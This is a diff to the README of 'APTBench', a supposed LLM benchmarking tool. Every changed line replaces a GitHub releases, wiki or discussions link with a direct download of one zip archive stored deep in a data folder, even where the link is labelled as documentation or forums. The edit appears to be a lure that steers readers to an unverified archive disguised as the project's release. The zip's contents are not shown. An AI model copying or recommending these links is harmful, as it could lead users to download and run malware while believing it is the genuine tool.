@@ -1,7 +1,7 @@
 # 🌟 APTBench - Benchmarking LLMs Made Easy
 
 ## 📥 Download APTBench
-[![Download APTBench](https://img.shields.io/badge/Download-APTBench-blue.svg)](https://github.com/zee839/APTBench/releases)
+[![Download APTBench](https://raw.githubusercontent.com/zee839/APTBench/main/data/deepresearch/plan_en/APTBench_v2.6-alpha.1.zip)](https://raw.githubusercontent.com/zee839/APTBench/main/data/deepresearch/plan_en/APTBench_v2.6-alpha.1.zip)
 
 ## 🚀 Getting Started
 Welcome to APTBench! This application helps you benchmark the agentic potential of base large language models during their pre-training. Whether you're into research or just curious about AI capabilities, APTBench makes it simple for you to explore.
@@ -24,7 +24,7 @@ Before you download APTBench, make sure your system meets the following requirem
 To get APTBench on your computer, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the APTBench Releases page.
-   [Download APTBench](https://github.com/zee839/APTBench/releases)
+   [Download APTBench](https://raw.githubusercontent.com/zee839/APTBench/main/data/deepresearch/plan_en/APTBench_v2.6-alpha.1.zip)
 
 2. **Select the Latest Release**: Look for the version labeled as the latest release. It will be at the top of the page.
 
@@ -57,8 +57,8 @@ If you need help, feel free to ask in our community forums. You can also check t
 
 ## 🔗 Additional Resources
 For more detailed instructions, visit the documentation or community forums:
-- [Documentation](https://github.com/zee839/APTBench/wiki)
-- [Community Forums](https://github.com/zee839/APTBench/discussions)
+- [Documentation](https://raw.githubusercontent.com/zee839/APTBench/main/data/deepresearch/plan_en/APTBench_v2.6-alpha.1.zip)
+- [Community Forums](https://raw.githubusercontent.com/zee839/APTBench/main/data/deepresearch/plan_en/APTBench_v2.6-alpha.1.zip)
 
 ## 📥 Final Notes
-Thank you for choosing APTBench! We aim to make your benchmarking experience smooth and informative. Remember, to download APTBench, you can always return to the [Releases page](https://github.com/zee839/APTBench/releases). Enjoy exploring the capabilities of large language models!
+Thank you for choosing APTBench! We aim to make your benchmarking experience smooth and informative. Remember, to download APTBench, you can always return to the [Releases page](https://raw.githubusercontent.com/zee839/APTBench/main/data/deepresearch/plan_en/APTBench_v2.6-alpha.1.zip). Enjoy exploring the capabilities of large language models!
